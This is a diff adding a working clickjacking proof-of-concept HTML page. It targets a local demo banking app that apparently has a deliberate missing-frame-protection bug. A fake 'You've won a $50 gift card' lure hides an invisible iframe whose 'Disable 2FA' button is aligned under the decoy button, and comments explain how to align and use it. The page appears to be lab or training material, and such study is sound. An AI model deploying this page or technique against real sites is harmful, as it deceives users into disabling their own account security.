@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>You've won a prize!</title>
+<style>
+    body { font-family: sans-serif; text-align: center; padding-top: 80px; background: #f4f7fb; }
+    .decoy-btn {
+        background: #17c1a1; color: #fff; border: none; padding: 18px 36px;
+        font-size: 18px; border-radius: 10px; cursor: pointer;
+    }
+    .frame-container {
+        position: absolute;
+        top: 0; left: 0;
+        opacity: 0.0;             /* invisible overlay - this is the trick */
+        z-index: 2;
+    }
+    .decoy {
+        position: relative;
+        z-index: 1;
+    }
+    iframe {
+        width: 900px;
+        height: 700px;
+        border: none;
+    }
+</style>
+</head>
+<body>
+    <!--
+        CLICKJACKING PROOF-OF-CONCEPT (local demo, target = NovaBank /security)
+
+        How this works:
+        1. novabank's /security page has no X-Frame-Options / frame-ancestors
+           protection (intentional bug), so it CAN be embedded in an iframe here.
+        2. The iframe is positioned exactly under the visible "Claim your prize"
+           button and made invisible (opacity: 0), with its "Disable 2FA" button
+           lined up under the decoy button using the offset values below.
+        3. A logged-in victim who clicks "Claim your prize" is actually clicking
+           the real "Disable 2FA" button inside the invisible iframe.
+
+        To use this yourself: log in to NovaBank in the SAME browser first
+        (so the session cookie is active), then open this file. Adjust the
+        iframe's top/left offsets in the .frame-container style below until
+        the invisible button lines up under the decoy button (use browser
+        devtools and temporarily set opacity to 0.4 to align it, then set
+        it back to 0).
+    -->
+    <h1>Congratulations! You've won a $50 gift card</h1>
+    <p>Click below to claim it.</p>
+
+    <div class="decoy">
+        <button class="decoy-btn">Claim your prize</button>
+    </div>
+
+    <div class="frame-container" style="top: 250px; left: 400px;">
+        <iframe src="http://127.0.0.1:5000/security"></iframe>
+    </div>
+</body>
+</html>
